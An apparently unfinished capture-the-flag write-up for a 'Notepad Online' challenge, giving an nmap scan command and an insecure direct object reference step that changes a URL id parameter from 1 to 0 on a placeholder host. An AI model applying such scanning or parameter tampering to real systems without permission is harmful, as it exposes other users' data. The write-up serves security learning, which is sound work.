# Notepad Online

![Image](https://github.com/user-attachments/assets/a4c9b3a4-b068-4b08-a266-b08ecc29349e)

1. Reconnisance
   nmap for scan
```
  nmap [IP ADDRESS] -sV -sC
```
2. Exploit
change the URL parameter id=1 to id=0.
this attack called  insecure direct object reference (IDOR).
```
http:/asshole.com/category?id=1
http:/asshole.com/category?id=0
```
4. 
